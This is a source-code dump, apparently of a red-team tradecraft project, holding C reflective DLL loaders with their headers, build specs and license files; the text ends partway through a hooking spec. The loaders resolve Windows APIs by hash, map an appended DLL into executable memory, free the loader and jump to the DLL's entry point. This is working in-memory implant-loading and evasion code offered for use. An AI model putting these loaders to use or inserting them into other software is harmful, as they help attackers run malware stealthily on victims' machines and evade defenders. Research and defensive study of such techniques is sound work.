 * Jenkins One-at-a-Time hash
 * https://www.burtleburtle.net/bob/hash/doobs.html
 */
DWORD joaat_module(char * value, USHORT counter) {
	DWORD hash = 0;

	do {
		if (*value >= 'a')
			hash += (BYTE)*value - 0x20;
		else
			hash += (BYTE)*value;

		hash += (hash << 10);
		hash ^= (hash >> 6);
		value++;
	} while (--counter);

	hash += (hash << 3);
	hash ^= (hash >> 11);
	hash += (hash << 15);

	return hash;
}

DWORD joaat_function(char * value) {
	DWORD hash = 0;

	do {
		hash += (BYTE)*value;
		hash += (hash << 10);
		hash ^= (hash >> 6);
		value++;
	} while (*value);

	hash += (hash << 3);
	hash ^= (hash >> 11);
	hash += (hash << 15);

	return hash;
}

/*
 * sdbm hash
 * http://www.cse.yorku.ca/~oz/hash.html
 */
DWORD sdbm_module(char * value, USHORT counter) {
	DWORD hash = 0;

	do {
		hash *= 65599;

		if (*value >= 'a')
			hash += (BYTE)*value - 0x20;
		else
			hash += (BYTE)*value;

		value++;
	} while (--counter);

	return hash;
}

DWORD sdbm_function(char * value) {
	DWORD hash = 0;

	do {
		hash = *value + (hash * 65599);
		value++;
	} while (*value);

	return hash;
}

```

## File: simple_rdll_apihash/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));

char * findAppendedDLL() {
	return (char *)&__DLLDATA__;
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	char       * dst;
	char       * src;
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	/* find our DLL appended to this PIC */
	src = findAppendedDLL();

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* pass execution to our DLL */
	EntryPoint(&data, dst)((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
}

```

## File: simple_rdll_apihash/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_free/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_free/loader.spec

```text
#
# Simple Reflective DLL build spec
#
x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# OPT into PIC dynamic function resolution
		dfr "_resolve" "ror13"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $DLL
			link "my_data"

		# load our free() PICO
		load "bin/free.x86.o"
			make object
			export
			link "my_bof"
	
	# we're done, export the final blob
	export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst

		dfr "resolve" "ror13"
		mergelib "../libtcg/libtcg.x64.zip"

		push $DLL
			link "my_data"

		load "bin/free.x64.o"
			make object
			export
			link "my_bof"
	
	export

```

## File: simple_rdll_free/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/free.c -o bin/free.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/free.c -o bin/free.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_free/src/free.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>

WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

void go(char * loader, char * dllEntry, char * dllBase) {
	/* free our loader */
	KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);

	/* call the entry point of our Reflective DLL */
	((DLLMAIN_FUNC)dllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

	/* exit the current thread.. else... we return to our free'd() memory and we don't want that. */
	KERNEL32$ExitThread(0);
}

```

## File: simple_rdll_free/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));
char __BOFDATA__[0] __attribute__((section("my_bof")));

char * findAppendedDLL() {
	return (char *)&__DLLDATA__;
}

char * findAppendedPICO() {
	return (char *)&__BOFDATA__;
}

/*
 * Get the start address of our PIC DLL loader.
 */
void go();

char * getStart() {
	return (char *)go;
}

/*
 * Our PICO loader, have fun, go nuts!
 */
typedef void (*PICOMAIN_FUNC_3)(char * loader, char * dllEntry, char * dllBase);

void RunViaFreeCOFF(IMPORTFUNCS * funcs, char * dllEntry, char *dllBase) {
	char        * dstCode;
	char        * dstData;
	char        * src = findAppendedPICO();

	/* allocate memory for our PICO */
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );

	/* load our pico into our destination address, thanks! */
	PicoLoad(funcs, src, dstCode, dstData);

	/* execute our pico */
	((PICOMAIN_FUNC_3)PicoEntryPoint(src, dstCode)) (getStart(), dllEntry, dllBase);
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	char       * dst;
	char       * src;
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	/* find our DLL appended to this PIC */
	src = findAppendedDLL();

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* pass to our BOF */
	RunViaFreeCOFF(&funcs, (char *)EntryPoint(&data, dst), dst);
}

```

## File: simple_rdll_free/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_hook/freeandrun.spec

```text
#
# A little doodad to call free() a DLL loader and pass execution to a DLL
# 

x86:
	# load our free COFF and merge it
	load "bin/free.x86.o"
		merge

	# export freeAndRun for use with PicoGetExport
	exportfunc "_freeAndRun" "___tag_freeandrun"

x64:
	load "bin/free.x64.o"
		merge

	exportfunc "freeAndRun" "__tag_freeandrun"

```

## File: simple_rdll_hook/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_hook/loader.spec

```text
#
# Demonstrate loading a DLL and hooking functions.
#
name     "Simple Loader (Hooking)"
describe "A base DLL loader that supports layered hooking"
author   "Adversary Fan Fiction Writers Guild"

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst +optimize

		# opt into a PIC services module for dfr, fixbss, fixptrs
		run "../simple_pic/services.spec"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $DLL
			link "my_data"

		# loop through the hooking modules specified in %HOOKS and call their setup targets
		foreach %HOOKS: call %_ "setup"

		# load our hook PICO
		load "bin/hook.x86.o"
			make object +optimize

			# merge LibTCG for ror13hash function, +optimize gets rid of everything else
			mergelib "../libtcg/libtcg.x86.zip"

			# bring our freeAndRun() functionality into this PICO
			run "freeandrun.spec"

			# loop through the hooking modules specified in %HOOKS and call their hooks targets
			foreach %HOOKS: call %_ "hooks"

			# filter out any hooks our DLL capability will not need.
			filterhooks $DLL

			# register our GetProcAddress as an explicit hook, so we can propgate to other stuff
			addhook "KERNEL32$GetProcAddress" "__GetProcAddress@8"

			# export and link it
			export
			link "my_hooks"
	
		# we're done, export the final blob
		export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		run "../simple_pic/services.spec"
		mergelib "../libtcg/libtcg.x64.zip"

		push $DLL
			link "my_data"

		foreach %HOOKS: call %_ "setup"

		load "bin/hook.x64.o"
			make object +optimize

			mergelib "../libtcg/libtcg.x64.zip"

